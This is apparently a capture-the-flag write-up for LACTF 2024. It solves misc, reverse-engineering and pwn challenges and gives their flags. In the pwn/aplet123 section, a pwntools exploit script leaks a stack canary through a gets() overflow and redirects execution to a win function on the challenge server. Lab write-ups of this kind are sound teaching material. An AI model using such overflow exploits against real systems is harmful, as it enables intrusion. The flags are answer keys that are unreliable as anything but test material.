# LACTF2024

## Table of Contents
- [misc/infinite loop](#miscinfinite-loop)
- [misc/mixed signals](#miscmixed-signals)
- [misc/closed](#miscclosed)
- [rev/shattered memories](#revshattered-memories)
- [rev/aplet321](#revaplet321)
- [rev/the secret of java island](#revthe-secret-of-java-island)
- [pwn/aplet123](#pwnaplet123)
- [pwn/52 card monty](#pwn52-card-monty)
- [pwn/sus](#pwnsus)
- [pwn/pizza](#pwnpizza)

## Misc/Infinite Loop

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/70683b49-1cb9-40e3-8859-f4626eb68b29)

A google form challenge where it constantly loops and brings you back to the same page. Click on inspect source and search for the string "lactf" will reveal the flag.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/8cb5b24d-ea52-4432-b0d5-2ee13e8a5947)

## Misc/Mixed Signals

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/18970d3f-026d-447d-bb12-22e1a0a9b1b8)

The authors accidentally uploaded the wrong file so we could hear the flag directly just by playing the video. Just replace the phonetic alphabets (eg: Alpha = A, Bravo = B, Charie = C)

## Misc/Closed

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/4717d495-bce0-44d2-815c-be23542e1e48)

### Image given : 

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/a12b5b1d-8787-479a-8344-620d1e4560a7)

From the image above, we can deduce that this location is in California and its located next to a big body of water.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/3f0b9777-ef5c-4f96-83d8-d062ba10f72c)

On closer inspection, we can see words which I can only assume is "Shore Trail". So I used the app AllTrails and searched for the term "Shore Trail California". The results show that there is a East Shore Trail, West Shore Trail and South Shore Trail. So I immediately went to Google Maps and manually looked at each trail.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/c449baf6-4d3e-4db4-99cf-965cbba6a039)

The South Shore Trail looked the most promising.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/97a57776-2ec0-4932-b19a-fc1b2150f27e)

We found the exact rock in the picture. Clicking on the bottom left corner of the rock gave us the coordinates

> Flag : lactf{36.516,-121.949}

## Rev/Shattered Memories

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/50152667-d4ed-44e9-81a1-a39c85146872)

```
└─$ strings shattered-memories      
What was the flag again?
No, I definitely remember it being a different length...
t_what_f
t_means}
nd_forge
lactf{no
orgive_a
No, that definitely isn't it.
```

Just run strings on it and reassemble the flag.

## Rev/Aplet321

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/a7153847-f008-4075-a2ec-ce09869d8dd5)

### Decompiled Code
```c
    do {
      iVar1 = strncmp(pcVar3,"pretty",6);
      NumOfPretty = NumOfPretty + (uint)(iVar1 == 0);
      iVar1 = strncmp(pcVar3,"please",6);
      NumOfPlease = NumOfPlease + (uint)(iVar1 == 0);
      pcVar3 = pcVar3 + 1;
    } while (pcVar3 != acStack_237 + ((int)sVar2 - 6));
    if (NumOfPlease != 0) {
      pcVar3 = strstr(&local_238,"flag");
      if (pcVar3 == (char *)0x0) {
        puts("sorry, i didn\'t understand what you mean");
        return 0;
      }
      if ((NumOfPretty + NumOfPlease == 0x36) && (NumOfPretty - NumOfPlease == -0x18)) {
        puts("ok here\'s your flag");
        system("cat flag.txt");
        return 0;
      }
```

The program will print out the flag if we say "pretty" 15 times, "please" 39 times and "flag".

```
prettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettyprettypleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleasepleaseflag
```

## Rev/The Secret of Java Island

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/241f0499-e9ac-4cdd-89d7-da1bcadb2901)

We are provided with a jar file

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/415ce8fa-abdd-48af-877b-39c27ce5a431)

Looks like its a choice-driven game when running the program. Decompile the jar file using a [online decompiler](https://www.decompiler.com/).

From the decompiled code, the game moves from state to state depending on the choices we make.

```java
 case 5:
         try {
            Socket var0 = new Socket("chall.lac.tf", 31151);
            String var1 = "";

            int var3;
            for(Iterator var2 = history.iterator(); var2.hasNext(); var1 = var1 + var3) {
               var3 = (Integer)var2.next();
            }

            var0.getOutputStream().write((var1 + "\n").getBytes("UTF-8"));
            Scanner var5 = new Scanner(var0.getInputStream());
            String var6 = var5.nextLine();
            story.setText(var6);
            var5.close();
            var0.close();
         } catch (Exception var4) {
            System.err.println(var4.getMessage());
            story.setText("<html>The flag is garbled and unreadable. Contact an admin if you haven't done anything out of the ordinary.</html>");
         }

         button1.setText("Leave");
         button2.setText("Leave");
         break;
```

State 5 prints out the flag so this should be our end goal.

```java
      case 3:
         if (!hasGlove) {
            System.exit(0);
         } else {
            state = 5;
         }
```

For us to reach state 5, we will need to be in state 3 and hasGlove must be true. 

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/805c1736-a729-42f3-9368-811f4734ffeb)

I wrote down all the conditions on a piece of paper to visualize it

```java
case 4:
         if (var0 == 0) {
            exploit = exploit + "d";
            story.setText("You clobbered the DOM. That was exploit #" + exploit.length() + ".");
         } else {
            exploit = exploit + "p";
            story.setText("You polluted the prototype. That was exploit #" + exploit.length() + ".");
         }

         if (exploit.length() == 8) {
            try {
               MessageDigest var1 = MessageDigest.getInstance("SHA-256");
               if (!Arrays.equals(var1.digest(exploit.getBytes("UTF-8")), new byte[]{69, 70, -81, -117, -10, 109, 15, 29, 19, 113, 61, -123, -39, 82, -11, -34, 104, -98, -111, 9, 43, 35, -19, 22, 52, -55, -124, -45, -72, -23, 96, -77})) {
                  state = 7;
               } else {
                  state = 6;
               }

               updateGame();
            } catch (Exception var2) {
               throw new RuntimeException(var2);
            }
         }

         return;
```

We need to go to state 6 to set hasGlove to True and to do that, we need to first bypass state 4 which hashes the string variable when its length is 8 and compares it to a hardcoded hash. We need to figure out the sequence of exploit to pass this check. Luckily, the length of the string is only 8 so there are only 256 possible permutations of "dddddddd" to "pppppppp". I made ChatGPT create a java program to bruteforce it.

<details>
<summary>Hash Script</summary>

```java
public class omg {
    private static final byte[] EXPECTED_HASH = {69, 70, -81, -117, -10, 109, 15, 29, 19, 113, 61, -123, -39, 82, -11, -34, 104, -98, -111, 9, 43, 35, -19, 22, 52, -55, -124, -45, -72, -23, 96, -77};

    public static void generateCombinations(int length) {
        String[] options = {"d", "p"};

        for (int i = 0; i < Math.pow(2, length); i++) {
            StringBuilder combination = new StringBuilder();
            for (int j = length - 1; j >= 0; j--) {
                int bit = (i >> j) & 1;
                combination.append(options[bit]);
            }
            if (checkHash(combination.toString())) {
                System.out.println("Matching combination found: " + combination);
            }
        }
    }

    private static boolean checkHash(String combination) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(combination.getBytes("UTF-8"));
            return Arrays.equals(hash, EXPECTED_HASH);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public static void main(String[] args) {
        int length = 8;
        generateCombinations(length);
    }
}
```
</details>

The matching combination was "dpddpdpp". With that, we have everything we need

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/eb85b60b-fd73-4065-a243-b93b42e5bf7d)

## Pwn/Aplet123

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/34702286-9d84-4765-98c8-aba4cf0857d6)

We are given an executable and the source code to it.

<details>
<summary>Source Code</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

void print_flag(void) {
  char flag[256];
  FILE *flag_file = fopen("flag.txt", "r");
  fgets(flag, sizeof flag, flag_file);
  puts(flag);
}

const char *const responses[] = {"L",
                                 "amongus",
                                 "true",
                                 "pickle",
                                 "GINKOID",
                                 "L bozo",
                                 "wtf",
                                 "not with that attitude",
                                 "increble",
                                 "based",
                                 "so true",
                                 "monka",
                                 "wat",
                                 "monkaS",
                                 "banned",
                                 "holy based",
                                 "daz crazy",
                                 "smh",
                                 "bruh",
                                 "lol",
                                 "mfw",
                                 "skissue",
                                 "so relatable",
                                 "copium",
                                 "untrue!",
                                 "rolled",
                                 "cringe",
                                 "unlucky",
                                 "lmao",
                                 "eLLe",
                                 "loser!",
                                 "cope",
                                 "I use arch btw"};

int main(void) {
  setbuf(stdout, NULL);
  srand(time(NULL));
  char input[64];
  puts("hello");
  while (1) {
    gets(input);
    char *s = strstr(input, "i'm");
    if (s) {
      printf("hi %s, i'm aplet123\n", s + 4);
    } else if (strcmp(input, "please give me the flag") == 0) {
      puts("i'll consider it");
      sleep(5);
      puts("no");
    } else if (strcmp(input, "bye") == 0) {
      puts("bye");
      break;
    } else {
      puts(responses[rand() % (sizeof responses / sizeof responses[0])]);
    }
  }
}
```
</details>

We immediately notice the use of gets() so theres a buffer overflow. Looking at the source code, the only way we can get a leak is by the printf(). First, I tried to completely fill the buffer until the canary so that the canary will be leaked out with it but that didnt work because the least signifcant bit (LSB) of the canary is a null byte so the print will just stop at the \x00.

```python
p.sendlineafter(b"hello\n", "A"*69 + "i'm")   # Note : the actual size of the buffer is 72, eventhough the source code said 64
```

We will modify our payload to add "i'm" at the end to take advantage of the s+4 behaviour

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/557d3836-2a5f-4b3a-b763-f5e378e7d97a)


```
└─$ checksec --file=aplet123
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   49 Symbols        No    0               3               aplet123
```

Looking at the protections enabled, there is a stack canary so we will need to find a way to leak the canary.

<details>
<summary>Exploit Script</summary>

```python
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./aplet123')

host = "chall.lac.tf"
port = 31123

gdb_script = '''

'''

#p = exe.process()
p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

leak_canary_offset = 69
offset = 72
win = 0x004011e6

p.sendlineafter(b"hello\n", "A"*leak_canary_offset + "i'm")
p.recvuntil(b"hi ")
leak = p.recv(7)
leak = b"\x00" + leak
canary = u64(leak)

payload = b"A" * offset
payload += p64(canary) * 2
payload += p64(win)

p.sendlineafter(b"aplet123\n", payload)
p.sendline("bye")

p.interactive()

# lactf{so_untrue_ei2p1wfwh9np2gg6} 

```
</details>

## Pwn/52 Card Monty

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/04046e49-dccc-4253-af8f-efa93b818930)

## Pwn/Sus

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/c2483fba-441e-420a-9f16-a6fdddafe1e7)

## Pwn/Pizza

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/f02ed5bf-381d-4393-8e66-56cd0d949531)
